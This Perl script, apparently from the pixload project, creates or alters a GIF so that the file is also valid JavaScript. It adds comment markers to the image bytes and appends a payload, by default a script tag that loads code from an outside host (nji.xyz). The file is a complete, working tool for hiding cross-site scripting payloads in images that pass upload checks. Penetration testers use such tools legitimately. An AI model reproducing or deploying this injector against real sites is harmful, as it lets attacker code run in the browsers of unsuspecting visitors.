#!/usr/bin/perl
#
# GIF Payload Creator/Injector
#
# coded by chinarulezzz, alexandr.savca89@gmail.com
# credits to marcoramilli.blogspot.com
#
# See LICENSE file for copyright and license details.
#

use strict;
use warnings;
use feature 'say';

use Getopt::Long;
use GD;

sub usage;
sub create_gif;
sub inject_payload;

# Command line options
GetOptions(
    'help!'     =>  \my $help,
    'payload=s' =>  \my $payload,
    'output=s'  =>  \my $outfile,
);
usage(0)     if $help;
usage(1) unless $outfile;

$payload //= '<script src=//nji.xyz></script>';

say <<EOF;
[>|      GIF Payload Creator/Injector       |<]

    https://github.com/chinarulezzz/pixload

EOF

create_gif              unless -f $outfile;

inject_payload;

say `file       $outfile`   if -f '/usr/bin/file';
say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   
#                                Subroutines                                  #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   

sub usage {
    say <<"EOF";
Usage: $0 [-payload 'STRING'] -output payload.gif

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be generated.
EOF
    exit +shift;
}

sub create_gif {
    say "[>] Generating output file";

    my $img = GD::Image->new(
        32,
        32,
         1, # Set 1 to TrueColor (24 bits of color data), default is 8-bit palette
    );

    my $color = $img->colorAllocate(0, 0, 0);

    $img->setPixel(0, 0, $color);

    open my $fh, '>', $outfile or die;
    binmode $fh;
    print   $fh  $img->gif;
    close   $fh;

    say "[✔] File saved to: $outfile\n";
}

sub inject_payload {
    say "[>] Injecting payload into $outfile";

    sysopen my $fh, $outfile, 1 or die;
    sysseek    $fh, 6, 0;

    syswrite   $fh, "\x2f\x2a";
    sysseek    $fh, 0, 2;

    syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
    syswrite   $fh, $payload;
    syswrite   $fh, "\x3b";

    close      $fh;

    say "[✔] Payload was injected successfully\n";
}

# vim:sw=4:ts=4:sts=4:et:cc=80
# End of file
